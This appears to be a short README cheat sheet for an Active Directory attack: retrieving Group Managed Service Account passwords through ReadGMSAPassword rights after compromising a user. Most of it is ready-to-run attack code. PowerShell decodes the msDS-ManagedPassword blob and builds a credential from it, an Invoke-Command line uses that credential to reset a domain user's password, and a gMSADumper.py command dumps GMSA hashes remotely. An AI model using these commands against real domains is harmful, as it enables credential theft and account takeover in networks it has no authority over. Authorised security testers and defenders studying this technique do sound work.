# Group Managed Service Accounts
Retrieve passwords from Group Managed Service Accounts (GMSA) that you have ReadGMSAPassword permissions over.

If the user you have owned has ReadGMSAPassword permissions over a GMSA you are able to retreive this users password.

<img src="https://raw.githubusercontent.com/glowbase/group-managed-service-accounts/main/20220809203905465.png" width="500px" />

## Local

```powershell
$gmsa = Get-ADServiceAccount -Identity 'GMSA-USER' -Properties 'msDS-ManagedPassword'
$mp = $gmsa.'msDS-ManagedPassword'

ConvertFrom-ADManagedPasswordBlob $mp
```

You can either obtain and reuse the plaintext password or invoke commands as the GMSA.

```powershell
# Create credential object.
$cred = new-object system.management.automation.PSCredential "DOMAIN\GMSA-USER",(ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword
```

Execute commands via `Invoke-Command` as GMSA.

```powershell
Invoke-Command -ComputerName COMPUTER_NAME -Credential $cred -ScriptBlock {net user someuser password123! /domain}
```

## Remote

You can use [gMSADumper.py](https://raw.githubusercontent.com/micahvandeusen/gMSADumper/main/gMSADumper.py) to remotely dump hashes/passwords.

```bash
python3 gMSADumper.py -u USERNAME -p PASSWORD -l DOMAIN.LOCAL -d DOMAIN.LOCAL
```

## Additional Resources
- Additional GMSA Attacks - [https://adsecurity.org/?p=4367](https://adsecurity.org/?p=4367)
- Overview of GMSA - [https://docs.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview](https://docs.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview)
